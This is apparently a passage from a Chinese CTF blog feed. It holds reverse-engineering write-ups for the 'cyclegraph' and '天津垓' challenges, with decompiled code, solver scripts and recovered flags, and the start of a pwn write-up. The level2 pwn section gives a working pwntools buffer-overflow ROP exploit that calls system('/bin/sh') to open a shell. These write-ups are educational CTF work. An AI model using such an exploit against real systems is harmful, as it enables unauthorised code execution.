11)#define SBYTE12(x)  SBYTEn(x, 12)#define SBYTE13(x)  SBYTEn(x, 13)#define SBYTE14(x)  SBYTEn(x, 14)#define SBYTE15(x)  SBYTEn(x, 15)#define SWORD1(x)   SWORDn(x,  1)#define SWORD2(x)   SWORDn(x,  2)#define SWORD3(x)   SWORDn(x,  3)#define SWORD4(x)   SWORDn(x,  4)#define SWORD5(x)   SWORDn(x,  5)#define SWORD6(x)   SWORDn(x,  6)#define SWORD7(x)   SWORDn(x,  7)// Helper functions to represent some assembly instructions.#ifdef __cplusplus// Fill memory block with an integer valueinline void memset32(void *ptr, uint32 value, int count)&#123;  uint32 *p = (uint32 *)ptr;  for ( int i=0; i &lt; count; i++ )    *p++ = value;&#125;// Generate a reference to pair of operandstemplate&lt;class T&gt;  int16 __PAIR__( int8  high, T low) &#123; return ((( int16)high) &lt;&lt; sizeof(high)*8) | uint8(low); &#125;template&lt;class T&gt;  int32 __PAIR__( int16 high, T low) &#123; return ((( int32)high) &lt;&lt; sizeof(high)*8) | uint16(low); &#125;template&lt;class T&gt;  int64 __PAIR__( int32 high, T low) &#123; return ((( int64)high) &lt;&lt; sizeof(high)*8) | uint32(low); &#125;template&lt;class T&gt; uint16 __PAIR__(uint8  high, T low) &#123; return (((uint16)high) &lt;&lt; sizeof(high)*8) | uint8(low); &#125;template&lt;class T&gt; uint32 __PAIR__(uint16 high, T low) &#123; return (((uint32)high) &lt;&lt; sizeof(high)*8) | uint16(low); &#125;template&lt;class T&gt; uint64 __PAIR__(uint32 high, T low) &#123; return (((uint64)high) &lt;&lt; sizeof(high)*8) | uint32(low); &#125;// rotate lefttemplate&lt;class T&gt; T __ROL__(T value, uint count)&#123;  const uint nbits = sizeof(T) * 8;  count %= nbits;  T high = value &gt;&gt; (nbits - count);  value &lt;&lt;= count;  value |= high;  return value;&#125;// rotate righttemplate&lt;class T&gt; T __ROR__(T value, uint count)&#123;  const uint nbits = sizeof(T) * 8;  count %= nbits;  T low = value &lt;&lt; (nbits - count);  value &gt;&gt;= count;  value |= low;  return value;&#125;// carry flag of left shifttemplate&lt;class T&gt; int8 __MKCSHL__(T value, uint count)&#123;  const uint nbits = sizeof(T) * 8;  count %= nbits;  return (value &gt;&gt; (nbits-count)) &amp; 1;&#125;// carry flag of right shifttemplate&lt;class T&gt; int8 __MKCSHR__(T value, uint count)&#123;  return (value &gt;&gt; (count-1)) &amp; 1;&#125;// sign flagtemplate&lt;class T&gt; int8 __SETS__(T x)&#123;  if ( sizeof(T) == 1 )    return int8(x) &lt; 0;  if ( sizeof(T) == 2 )    return int16(x) &lt; 0;  if ( sizeof(T) == 4 )    return int32(x) &lt; 0;  return int64(x) &lt; 0;&#125;// overflow flag of subtraction (x-y)template&lt;class T, class U&gt; int8 __OFSUB__(T x, U y)&#123;  if ( sizeof(T) &lt; sizeof(U) )  &#123;    U x2 = x;    int8 sx = __SETS__(x2);    return (sx ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2-y));  &#125;  else  &#123;    T y2 = y;    int8 sx = __SETS__(x);    return (sx ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x-y2));  &#125;&#125;// overflow flag of addition (x+y)template&lt;class T, class U&gt; int8 __OFADD__(T x, U y)&#123;  if ( sizeof(T) &lt; sizeof(U) )  &#123;    U x2 = x;    int8 sx = __SETS__(x2);    return ((1 ^ sx) ^ __SETS__(y)) &amp; (sx ^ __SETS__(x2+y));  &#125;  else  &#123;    T y2 = y;    int8 sx = __SETS__(x);    return ((1 ^ sx) ^ __SETS__(y2)) &amp; (sx ^ __SETS__(x+y2));  &#125;&#125;// carry flag of subtraction (x-y)template&lt;class T, class U&gt; int8 __CFSUB__(T x, U y)&#123;  int size = sizeof(T) &gt; sizeof(U) ? sizeof(T) : sizeof(U);  if ( size == 1 )    return uint8(x) &lt; uint8(y);  if ( size == 2 )    return uint16(x) &lt; uint16(y);  if ( size == 4 )    return uint32(x) &lt; uint32(y);  return uint64(x) &lt; uint64(y);&#125;// carry flag of addition (x+y)template&lt;class T, class U&gt; int8 __CFADD__(T x, U y)&#123;  int size = sizeof(T) &gt; sizeof(U) ? sizeof(T) : sizeof(U);  if ( size == 1 )    return uint8(x) &gt; uint8(x+y);  if ( size == 2 )    return uint16(x) &gt; uint16(x+y);  if ( size == 4 )    return uint32(x) &gt; uint32(x+y);  return uint64(x) &gt; uint64(x+y);&#125;#else// The following definition is not quite correct because it always returns// uint64. The above C++ functions are good, though.#define __PAIR__(high, low) (((uint64)(high)&lt;&lt;sizeof(high)*8) | low)// For C, we just provide macros, they are not quite correct.#define __ROL__(x, y) __rotl__(x, y)      // Rotate left#define __ROR__(x, y) __rotr__(x, y)      // Rotate right#define __CFSHL__(x, y) invalid_operation // Generate carry flag for (x&lt;&lt;y)#define __CFSHR__(x, y) invalid_operation // Generate carry flag for (x&gt;&gt;y)#define __CFADD__(x, y) invalid_operation // Generate carry flag for (x+y)#define __CFSUB__(x, y) invalid_operation // Generate carry flag for (x-y)#define __OFADD__(x, y) invalid_operation // Generate overflow flag for (x+y)#define __OFSUB__(x, y) invalid_operation // Generate overflow flag for (x-y)#endif// No definition for rcl/rcr because the carry flag is unknown#define __RCL__(x, y)    invalid_operation // Rotate left thru carry#define __RCR__(x, y)    invalid_operation // Rotate right thru carry#define __MKCRCL__(x, y) invalid_operation // Generate carry flag for a RCL#define __MKCRCR__(x, y) invalid_operation // Generate carry flag for a RCR#define __SETP__(x, y)   invalid_operation // Generate parity flag for (x-y)// In the decompilation listing there are some objects declarared as _UNKNOWN// because we could not determine their types. Since the C compiler does not// accept void item declarations, we replace them by anything of our choice,// for example a char:#define _UNKNOWN char#ifdef _MSC_VER#define snprintf _snprintf#define vsnprintf _vsnprintf#endif</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> IDA </tag>
            
            <tag> 查表 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高校战疫-两道re-wp</title>
      <link href="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-%E4%B8%A4%E9%81%93re-wp/"/>
      <url>/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-%E4%B8%A4%E9%81%93re-wp/</url>
      
        <content type="html"><![CDATA[<p>这两天攻防世界有个比赛，上面的题目还不错，参与了一下，至于为什么是两道re，因为正好赶上数模美赛，没怎么有时间做（实际上就是因为菜</p><span id="more"></span><h4 id="cyclegraph"><a href="#cyclegraph" class="headerlink" title="cyclegraph"></a>cyclegraph</h4><pre><code class="c++">void FUN_00401080(void)&#123;  char cVar1;  char *pcVar2;  undefined4 *puVar3;  undefined1 unaff_DI;  int iVar4;  char local_20 [4];  char local_1c;  char acStack27 [16];  char local_b;  uint local_8;    local_8 = DAT_00403004 ^ (uint)&amp;stack0xfffffffc;  DAT_00403370 = 0;  puVar3 = &amp;DAT_00403384;  DAT_00403374 = &#39;0&#39;;  DAT_00403378 = &amp;DAT_00403380;  iVar4 = 0;  do &#123;    puVar3[-1] = *(undefined4 *)((int)null_ARRAY_00402178 + iVar4);    *(undefined4 **)puVar3 = &amp;DAT_00403380 + *(int *)((int)null_ARRAY_00402278 + iVar4) * 3;    *(undefined4 **)(puVar3 + 1) = &amp;DAT_00403380 + *(int *)((int)null_ARRAY_004021f8 + iVar4) * 3;    puVar3 = puVar3 + 3;    iVar4 = iVar4 + 4;  &#125; while ((int)puVar3 &lt; 0x403504);  print(&quot;You need a flag to get out of this:\n&quot;,unaff_DI);  scan(&amp;DAT_0040214c,0xe0);  iVar4 = 5;  do &#123;    cVar1 = local_20[iVar4];    if (*DAT_00403378 + (int)DAT_00403374 == (int)cVar1) &#123;      DAT_00403378 = (int *)DAT_00403378[1];    &#125;    else &#123;      if ((int)DAT_00403374 - *DAT_00403378 != (int)cVar1) &#123;        print(&quot;This is not flag~\n&quot;,unaff_DI);        system(&quot;pause&quot;);                    /* WARNING: Subroutine does not return */        exit(1);      &#125;      DAT_00403378 = (int *)DAT_00403378[2];    &#125;    DAT_00403374 = local_20[iVar4];    DAT_00403370 = DAT_00403370 + 1;    iVar4 = iVar4 + 1;  &#125; while (iVar4 &lt; 0x15);  if (((((local_20[0] == &#39;f&#39;) &amp;&amp; (local_20[1] == &#39;l&#39;)) &amp;&amp; (local_20[2] == &#39;a&#39;)) &amp;&amp;      ((local_20[3] == &#39;g&#39; &amp;&amp; (local_1c == &#39;&#123;&#39;)))) &amp;&amp; (local_b == &#39;&#125;&#39;)) &#123;    if ((DAT_00403370 &lt; 0x11) &amp;&amp; (DAT_00403378 == (int *)&amp;DAT_004034f4)) &#123;      pcVar2 = &quot;Congratulations!!\n&quot;;    &#125;    else &#123;      pcVar2 = &quot;This is not flag~\n&quot;;    &#125;  &#125;  else &#123;    pcVar2 = &quot;illegal input~\n&quot;;  &#125;  print(pcVar2,cVar1);  system(&quot;pause&quot;);  FUN_004011f4();  return;&#125;</code></pre><p>表面上看起来很复杂，仔细研究就会发现，开始的循环是在构造一个有向图，用到了一个结构体，而后面的部分是一个寻路的过程，正向的过程是根据输入的flag的值进行移动，最终走到最后一个位置，所以逆向的过程就是先寻找路径，然后通过找到的路径来计算flag的值</p><pre><code class="c++">#include &lt;iostream&gt;using namespace std;struct a &#123;    int val;    a *loc1;    a *loc2;&#125;;bool dfs(a *ss, a *ee, int n, a *s[]) &#123;    if (n == 0) &#123;        return ss == ee;    &#125;    if (dfs(ss-&gt;loc1, ee, n - 1, s)) &#123;        for (int i = 0; i &lt; 0x11; i++) &#123;            if (s[i] == nullptr) &#123;                s[i] = ss-&gt;loc1;                break;            &#125;        &#125;        return true;    &#125; else &#123;        if (dfs(ss-&gt;loc2, ee, n - 1, s)) &#123;            for (int i = 0; i &lt; 0x11; i++) &#123;                if (s[i] == nullptr) &#123;                    s[i] = ss-&gt;loc2;                    break;                &#125;            &#125;            return true;        &#125;    &#125;&#125;void fun() &#123;    int dword_402178[] =            &#123;                    52, 2, 44, 42, 6, 42, 47, 42, 51, 3, 2, 50, 50, 50, 48, 3, 1, 50, 43, 2, 46, 1, 2, 45, 50, 4, 45,                    48, 49, 47, 51, 5            &#125;;    int dword_4021F8[] =            &#123;                    1, 8, 7, 23, 9, 19, 31, 23, 9, 13, 12, 29, 10, 24, 9, 24, 25, 9, 26, 3, 22, 6, 17, 13, 7, 15, 20, 1,                    16, 4, 11, 31            &#125;;    int dword_402278[] =            &#123;                    2, 2, 1, 18, 7, 2, 26, 13, 4, 10, 4, 21, 14, 1, 0, 14, 5, 7, 28, 12, 28, 15, 15, 2, 16, 23, 30, 23,                    19, 9, 22, 31            &#125;;    a puVar3[32];    a *DAT_00403378 = puVar3;    a *s[0x12]= &#123;nullptr&#125;;    int i = 0;    do &#123;        puVar3[i].val = dword_402178[i];        puVar3[i].loc1 = &amp;puVar3[dword_402278[i]];        puVar3[i].loc2 = &amp;puVar3[dword_4021F8[i]];        i++;    &#125; while (i &lt; 32);    dfs(DAT_00403378, &amp;puVar3[31], 0x10, s);    DAT_00403378 = puVar3;    string flag;    int DAT_00403374 = 48;    char tmp;    for(int j=0; j &lt; 0x10; j++)    &#123;        if(s[0xf-j]==DAT_00403378-&gt;loc1)        &#123;            tmp=DAT_00403378-&gt;val + DAT_00403374;            DAT_00403378=DAT_00403378-&gt;loc1;        &#125; else&#123;            tmp=DAT_00403374 - DAT_00403378-&gt;val;            DAT_00403378=DAT_00403378-&gt;loc2;        &#125;        flag+=tmp;        DAT_00403374 = tmp;    &#125;    cout&lt;&lt;flag&lt;&lt;endl;//    int input[0x15];//    int iVar4 = 5;//    int DAT_00403374 = 48;//    do &#123;//        int cVar1 = input[iVar4];//        if (DAT_00403378-&gt;val + DAT_00403374 == cVar1) &#123;//            DAT_00403378 = DAT_00403378-&gt;loc1;//        &#125; else &#123;//            if (DAT_00403374 - DAT_00403378-&gt;val == cVar1) &#123;//                DAT_00403378 = DAT_00403378-&gt;loc2;//            &#125;//        &#125;//        DAT_00403374 = input[iVar4];//        iVar4 = iVar4 + 1;//    &#125; while (iVar4 &lt; 0x15);//    if (((((input[0] == &#39;f&#39;) &amp;&amp; (input[1] == &#39;l&#39;)) &amp;&amp; (input[2] == &#39;a&#39;)) &amp;&amp;//         ((input[3] == &#39;g&#39; &amp;&amp; (input[4] == &#39;&#123;&#39;)))) &amp;&amp; (input[0x14] == &#39;&#125;&#39;)) &#123;//        if (DAT_00403378 == &amp;puVar3[31]) &#123;//            string s = &quot;Congratulations!!\n&quot;;//        &#125;//    &#125;&#125;int main()&#123;    fun();    return 0;&#125;</code></pre><p>注释部分是对于程序的一个正向还原，寻路用到了<code>dfs</code>算法，不是很难。</p><p>最后得到flag</p><pre><code>flag&#123;d8b0bc97a6c0ba27&#125;</code></pre><h4 id="天津垓"><a href="#天津垓" class="headerlink" title="天津垓"></a>天津垓</h4><p>题目里所有的内容都是假面骑士……</p><p>首先可以关注到一个函数名为<code>f</code> 的函数，这个函数很简单</p><pre><code class="c++">__int64 __fastcall f(__int64 a1, char **a2, char **a3)&#123;  _main(a1, (__int64)a2, (__int64)a3);  printf(&quot;Authorize:&quot;);  sub_1004011F6();  sub_100401AA0();  return 0i64;&#125;int sub_1004011F6()&#123;  char v1; // [rsp+20h] [rbp-D0h]  char v2; // [rsp+21h] [rbp-CFh]  char v3; // [rsp+22h] [rbp-CEh]  char v4; // [rsp+23h] [rbp-CDh]  char v5; // [rsp+24h] [rbp-CCh]  char v6; // [rsp+25h] [rbp-CBh]  char v7; // [rsp+26h] [rbp-CAh]  char v8; // [rsp+27h] [rbp-C9h]  char v9; // [rsp+28h] [rbp-C8h]  char v10; // [rsp+29h] [rbp-C7h]  char v11; // [rsp+2Ah] [rbp-C6h]  char v12; // [rsp+2Bh] [rbp-C5h]  char v13; // [rsp+2Ch] [rbp-C4h]  char v14; // [rsp+2Dh] [rbp-C3h]  char v15; // [rsp+2Eh] [rbp-C2h]  char v16; // [rsp+2Fh] [rbp-C1h]  char v17; // [rsp+30h] [rbp-C0h]  char v18; // [rsp+31h] [rbp-BFh]  char Format[4]; // [rsp+38h] [rbp-B8h]  char v20[2]; // [rsp+3Dh] [rbp-B3h]  __int64 v21; // [rsp+40h] [rbp-B0h]  __int64 v22; // [rsp+48h] [rbp-A8h]  __int16 v23; // [rsp+50h] [rbp-A0h]  char v24; // [rsp+52h] [rbp-9Eh]  __int64 v25; // [rsp+60h] [rbp-90h]  __int64 v26; // [rsp+68h] [rbp-88h]  __int64 v27; // [rsp+70h] [rbp-80h]  __int64 v28; // [rsp+78h] [rbp-78h]  __int64 v29; // [rsp+80h] [rbp-70h]  __int16 v30; // [rsp+88h] [rbp-68h]  __int64 v31; // [rsp+90h] [rbp-60h]  __int64 v32; // [rsp+98h] [rbp-58h]  __int64 v33; // [rsp+A0h] [rbp-50h]  __int64 v34; // [rsp+A8h] [rbp-48h]  __int64 v35; // [rsp+B0h] [rbp-40h]  __int64 v36; // [rsp+B8h] [rbp-38h]  __int64 v37; // [rsp+C0h] [rbp-30h]  __int64 v38; // [rsp+C8h] [rbp-28h]  __int64 v39; // [rsp+DCh] [rbp-14h]  int v40; // [rsp+E4h] [rbp-Ch]  __int16 v41; // [rsp+E8h] [rbp-8h]  char v42; // [rsp+EAh] [rbp-6h]  char v43; // [rsp+EBh] [rbp-5h]  int i; // [rsp+ECh] [rbp-4h]  v39 = &#39;H_gnisiR&#39;;  v40 = &#39;eppo&#39;;  v41 = &#39;!r&#39;;  v42 = 0;  v31 = &#39;eht nehW&#39;;  v32 = &#39;oh evif &#39;;  v33 = &#39;sorc snr&#39;;  v34 = &#39;g eht ,s&#39;;  v35 = &#39;os nedlo&#39;;  v36 = &#39;HT reidl&#39;;  v37 = &#39;si RESUO&#39;;  v38 = &#39;\n.nrob &#39;;  v25 = &#39;t pmuj A&#39;;  v26 = &#39;ks eht o&#39;;  v27 = &#39; snrut y&#39;;  v28 = &#39;dir a ot&#39;;  v29 = &#39;.kcik re&#39;;  v30 = &#39;\n&#39;;  v21 = &#39;etneserP&#39;;  v22 = &#39;IAZ yb d&#39;;  v23 = &#39;\nA&#39;;  v24 = 0;  strcpy(v20, &quot;%s&quot;);  strcpy(Format, &quot;%20s&quot;);  v1 = 17;  v2 = 8;  v3 = 6;  v4 = 10;  v5 = 15;  v6 = 20;  v7 = 42;  v8 = 59;  v9 = 47;  v10 = 3;  v11 = 47;  v12 = 4;  v13 = 16;  v14 = 72;  v15 = 62;  v16 = 0;  v17 = 7;  v18 = 16;  scanf(Format, Str);  if ( strlen(Str) != 18 )  &#123;    printf(v20, &amp;v25);    exit(1);  &#125;  for ( i = 0; i &lt;= 17; ++i )  &#123;    v43 = ~(Str[i] &amp; *((_BYTE *)&amp;v39 + i % 14)) &amp; (Str[i] | *((_BYTE *)&amp;v39 + i % 14));    if ( v43 != *(&amp;v1 + i) )    &#123;      printf(v20, &amp;v25);      exit(1);    &#125;  &#125;  printf(v20, &amp;v31);  return printf(v20, &amp;v21);&#125;</code></pre><p>这里进行了简单的验证，中间得处理过程不是很好逆，因为涉及到与或非三种运算符，但是通过列真值表可以发现，这一串运算实际上和一个异或是一样的，所以这一部分就很好处理了</p><pre><code class="python">target = &#39;Rising_Hopper!&#39;flag = &#39;&#39;v1 = [17, 8, 6, 10, 15, 20, 42, 59, 47, 3, 47, 4, 16, 72, 62, 0, 7, 16]for i in range(18):    flag += chr(v1[i] ^ ord(target[i % 14]))print(flag)</code></pre><p>输出<code>Caucasus@s_ability</code>，尝试提交发现不对，这题应该没这么简单，在找找有没有遗漏的地方，然后通过<code>Str</code>的交叉引用结果找到了遗漏的部分</p><pre><code class="c++">int sub_100401A6C()&#123;  sub_100401506(sub_10040164D, 1045, (__int64)Str);  sub_10040162B();  return sub_10040164D();&#125;</code></pre><p>这个函数在输入并验证过<code>Str</code>之后又调用了我们的输入，肯定还会有后续的处理</p><pre><code class="c++">BOOL __fastcall sub_100401506(void *a1, int a2, __int64 a3)&#123;  BOOL result; // eax  DWORD flOldProtect; // [rsp+28h] [rbp-8h]  int i; // [rsp+2Ch] [rbp-4h]  LPVOID lpAddress; // [rsp+40h] [rbp+10h]  int v7; // [rsp+48h] [rbp+18h]  __int64 v8; // [rsp+50h] [rbp+20h]  lpAddress = a1;  v7 = a2;  v8 = a3;  if ( strlen(Str) != 18 )    exit(1);  if ( !VirtualProtect(lpAddress, v7, 0x40u, &amp;flOldProtect) )    exit(1);  for ( i = 0; i &lt; v7; ++i )    *((_BYTE *)lpAddress + i) ^= *(_BYTE *)(i % 18 + v8);  result = VirtualProtect(lpAddress, v7, flOldProtect, &amp;flOldProtect);  if ( !result )    exit(1);  return result;&#125;</code></pre><p>这里是经过处理之后的内容，实际上是对一个地址上的数据进行了处理，显然是一个<code>SMC</code>的过程，这个地址里存储的应该是有用的处理代码，我们输入的内容实际上也只是对数据解密的密钥而已，所以接下来写个IDC脚本来解密一下</p><pre><code class="c++">#include &lt;idc.idc&gt;static main() &#123;    auto start, end, addr;    auto v1 = 67;    auto v2 = 97;    auto v3 = 117;    auto v4 = 99;    auto v5 = 97;    auto v6 = 115;    auto v7 = 117;    auto v8 = 115;    auto v9 = 64;    auto v10 = 115;    auto v11 = 95;    auto v12 = 97;    auto v13 = 98;    auto v14 = 105;    auto v15 = 108;    auto v16 = 105;    auto v17 = 116;    auto v18 = 121;    start = 0x10040164D;    end = 0x100401A68;//    auto flag = &quot;Caucasus@s_ability&quot;;    auto flag;    auto i = 0;    for (addr = start; addr &lt; end; addr++) &#123;        if (i % 18 == 0)            flag = v1;        if (i % 18 == 1)            flag = v2;        if (i % 18 == 2)            flag = v3;        if (i % 18 == 3)            flag = v4;        if (i % 18 == 4)            flag = v5;        if (i % 18 == 5)            flag = v6;        if (i % 18 == 6)            flag = v7;        if (i % 18 == 7)            flag = v8;        if (i % 18 == 8)            flag = v9;        if (i % 18 == 9)            flag = v10;        if (i % 18 == 10)            flag = v11;        if (i % 18 == 11)            flag = v12;        if (i % 18 == 12)            flag = v13;        if (i % 18 == 13)            flag = v14;        if (i % 18 == 14)            flag = v15;        if (i % 18 == 15)            flag = v16;        if (i % 18 == 16)            flag = v17;        if (i % 18 == 17)            flag = v18;        PatchByte(addr, Byte(addr) ^ flag);        i++;    &#125;    AnalyzeArea(start, end);    Message(&quot;Down!&quot;);&#125;</code></pre><p>不是很会用IDC，而且还没有数组类型，只能这样用很多分支去判断，然后得到了新的汇编代码，如果是汇编很好的话就可以直接做了，我还是习惯了无脑<code>F5</code>，所以干脆<code>patch</code>了一下后面的垃圾数据，写了一个<code>retn</code>，然后创建函数，查看伪代码</p><pre><code class="c++">int sub_10040164D()&#123;  int result; // eax  char Str[74]; // [rsp+20h] [rbp-60h]  char v2[8]; // [rsp+6Ah] [rbp-16h]  __int16 v3; // [rsp+78h] [rbp-8h]  char v4; // [rsp+7Ah] [rbp-6h]  char v5[4]; // [rsp+7Bh] [rbp-5h]  char v6[8]; // [rsp+80h] [rbp+0h]  char v7[8]; // [rsp+A0h] [rbp+20h]  char Format[8]; // [rsp+D0h] [rbp+50h]  int v9; // [rsp+110h] [rbp+90h]  int v10; // [rsp+114h] [rbp+94h]  int v11; // [rsp+118h] [rbp+98h]  int v12; // [rsp+11Ch] [rbp+9Ch]  int v13; // [rsp+120h] [rbp+A0h]  int v14; // [rsp+124h] [rbp+A4h]  int v15; // [rsp+128h] [rbp+A8h]  int v16; // [rsp+12Ch] [rbp+ACh]  int v17; // [rsp+130h] [rbp+B0h]  int v18; // [rsp+134h] [rbp+B4h]  int v19; // [rsp+138h] [rbp+B8h]  int v20; // [rsp+13Ch] [rbp+BCh]  int v21; // [rsp+140h] [rbp+C0h]  int v22; // [rsp+144h] [rbp+C4h]  int v23; // [rsp+148h] [rbp+C8h]  int v24; // [rsp+14Ch] [rbp+CCh]  int v25; // [rsp+150h] [rbp+D0h]  int v26; // [rsp+154h] [rbp+D4h]  int v27; // [rsp+158h] [rbp+D8h]  int v28; // [rsp+15Ch] [rbp+DCh]  int v29; // [rsp+160h] [rbp+E0h]  int v30; // [rsp+164h] [rbp+E4h]  int v31; // [rsp+168h] [rbp+E8h]  int v32; // [rsp+16Ch] [rbp+ECh]  int v33; // [rsp+170h] [rbp+F0h]  int v34; // [rsp+174h] [rbp+F4h]  int v35; // [rsp+178h] [rbp+F8h]  int v36; // [rsp+17Ch] [rbp+FCh]  int v37; // [rsp+180h] [rbp+100h]  int v38; // [rsp+184h] [rbp+104h]  int v39; // [rsp+188h] [rbp+108h]  int v40; // [rsp+18Ch] [rbp+10Ch]  int v41; // [rsp+190h] [rbp+110h]  int v42; // [rsp+194h] [rbp+114h]  int v43; // [rsp+198h] [rbp+118h]  int v44; // [rsp+19Ch] [rbp+11Ch]  int v45; // [rsp+1A0h] [rbp+120h]  int v46; // [rsp+1A4h] [rbp+124h]  int v47; // [rsp+1A8h] [rbp+128h]  int v48; // [rsp+1ACh] [rbp+12Ch]  int v49; // [rsp+1B0h] [rbp+130h]  int v50; // [rsp+1B4h] [rbp+134h]  int v51; // [rsp+1B8h] [rbp+138h]  int v52; // [rsp+1BCh] [rbp+13Ch]  int v53; // [rsp+1C0h] [rbp+140h]  int v54; // [rsp+1C4h] [rbp+144h]  int v55; // [rsp+1C8h] [rbp+148h]  int v56; // [rsp+1CCh] [rbp+14Ch]  int v57; // [rsp+1D0h] [rbp+150h]  int v58; // [rsp+1D4h] [rbp+154h]  int v59; // [rsp+1D8h] [rbp+158h]  unsigned int v60; // [rsp+1E0h] [rbp+160h]  int v61; // [rsp+1E4h] [rbp+164h]  unsigned int v62; // [rsp+1E8h] [rbp+168h]  unsigned int i; // [rsp+1ECh] [rbp+16Ch]  v9 = 2007666;  v10 = 2125764;  v11 = 1909251;  v12 = 2027349;  v13 = 2421009;  v14 = 1653372;  v15 = 2047032;  v16 = 2184813;  v17 = 2302911;  v18 = 2263545;  v19 = 1909251;  v20 = 2165130;  v21 = 1968300;  v22 = 2243862;  v23 = 2066715;  v24 = 2322594;  v25 = 1987983;  v26 = 2243862;  v27 = 1869885;  v28 = 2066715;  v29 = 2263545;  v30 = 1869885;  v31 = 964467;  v32 = 944784;  v33 = 944784;  v34 = 944784;  v35 = 728271;  v36 = 1869885;  v37 = 2263545;  v38 = 2283228;  v39 = 2243862;  v40 = 2184813;  v41 = 2165130;  v42 = 2027349;  v43 = 1987983;  v44 = 2243862;  v45 = 1869885;  v46 = 2283228;  v47 = 2047032;  v48 = 1909251;  v49 = 2165130;  v50 = 1869885;  v51 = 2401326;  v52 = 1987983;  v53 = 2243862;  v54 = 2184813;  v55 = 885735;  v56 = 2184813;  v57 = 2165130;  v58 = 1987983;  v59 = 2460375;  strcpy(Format, &quot;Input the flag to hijack the ability of Hiden Intelligence:&quot;);  strcpy(v7, &quot;Progrise Key confirmed. Ready to break.\n&quot;);  strcpy(v6, &quot;Jacking Break! Zaia Enterprise.&quot;);  strcpy(v5, &quot;%59s&quot;);  v3 = 29477;  v4 = 0;  strcpy(v2, &quot;Not verified!&quot;);  v62 = 2147483659;  printf(Format);  scanf(v5, Str);  printf(v7);  if ( strlen(Str) != 51 )  &#123;    printf(v2);    exit(0);  &#125;  v61 = 19683;  for ( i = 0; i &lt;= 0x32; ++i )  &#123;    v60 = v61 * (unsigned int)(unsigned __int8)Str[i] % v62;    if ( v60 != *(&amp;v9 + i) )    &#123;      printf(v2);      exit(0);    &#125;  &#125;  printf(v6);  getchar();  result = getchar();  __asm &#123; icebp &#125;  return result;&#125;</code></pre><p>关键的处理只有一句，但是有个很烦的取余，仔细观察可以发现，<code>v62</code>这个数非常大，最后在计算的时候取不取这个余数都没关系，所以这一部分又变成了一个非常简单的除法，然后问题就很容易解决了</p><pre><code class="python">v9 = [2007666, 2125764, 1909251, 2027349, 2421009, 1653372, 2047032, 2184813, 2302911, 2263545, 1909251, 2165130,      1968300, 2243862, 2066715, 2322594, 1987983, 2243862, 1869885, 2066715, 2263545, 1869885, 964467, 944784, 944784,      944784, 728271, 1869885, 2263545, 2283228, 2243862, 2184813, 2165130, 2027349, 1987983, 2243862, 1869885, 2283228,      2047032, 1909251, 2165130, 1869885, 2401326, 1987983, 2243862, 2184813, 885735, 2184813, 2165130, 1987983,      2460375]v61 = 19683v62 = 0x8000000Bflag = &#39;&#39;for i in range(0x33):    flag += chr(v9[i] // v61)print(flag)</code></pre><p>输出flag</p><pre><code>flag&#123;Thousandriver_is_1000%_stronger_than_zero-one&#125;</code></pre><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>然后这次比赛就没打算再做了，<code>mobile</code>的题，研究了一下，应该不是特别难，但是没太有时间，又是作业又是网课又是美赛，让人很烦，如果后面有wp放出来的话再去研究研究，复现一下，做个补充。</p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> re </tag>
            
            <tag> 高校战“疫” </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-pwn部分题解（一）</title>
      <link href="/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2020/03/03/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>一直做re觉得有些枯燥，闲着没事做一做好久没碰的pwn</p><span id="more"></span><h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><p><code>checksec</code>一下，开了NX</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp)&#123;  vulnerable_function();  system(&quot;echo &#39;Hello World!&#39;&quot;);  return 0;&#125;ssize_t vulnerable_function()&#123;  char buf; // [esp+0h] [ebp-88h]  system(&quot;echo Input:&quot;);  return read(0, &amp;buf, 0x100u);&#125;</code></pre><p>程序中调用了system，在字符串视图里也找到了<code>&quot;/bin/sh&quot;</code>，所以构造一个ROP就可以，exp如下</p><pre><code class="python">from pwn import *io=process(&#39;./level2&#39;)# io=remote(&#39;111.198.29.45&#39;,52249)elf=ELF(&#39;./level2&#39;)sys_addr=elf.symbols[&#39;system&#39;]sh_addr=elf.search(&#39;/bin/sh&#39;).next()payload=&#39;a&#39;*(0x88+4)+p32(sys_addr)+p32(0)+p32(sh_addr)io.sendline(payload)io.interactive()</code></pre><h4 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h4><pre><code class="c++">__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  FILE *v3; // rdi  const char *v4; // rdi  int v6; // [rsp+4h] [rbp-3Ch]  int i; // [rsp+8h] [rbp-38h]  int v8; // [rsp+Ch] [rbp-34h]  char v9; // [rsp+10h] [rbp-30h]  unsigned int seed[2]; // [rsp+30h] [rbp-10h]  unsigned __int64 v11; // [rsp+38h] [rbp-8h]  v11 = __readfsqword(0x28u);  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  v3 = stderr;  setbuf(stderr, 0LL);  v6 = 0;  v8 = 0;  *(_QWORD *)seed = sub_BB0(v3, 0LL);  puts(&quot;-------------------------------&quot;);  puts(&quot;Welcome to a guess number game!&quot;);  puts(&quot;-------------------------------&quot;);  puts(&quot;Please let me know your name!&quot;);  printf(&quot;Your name:&quot;);  gets(&amp;v9);  v4 = (const char *)seed[0];  srand(seed[0]);  for ( i = 0; i &lt;= 9; ++i )  &#123;    v8 = rand() % 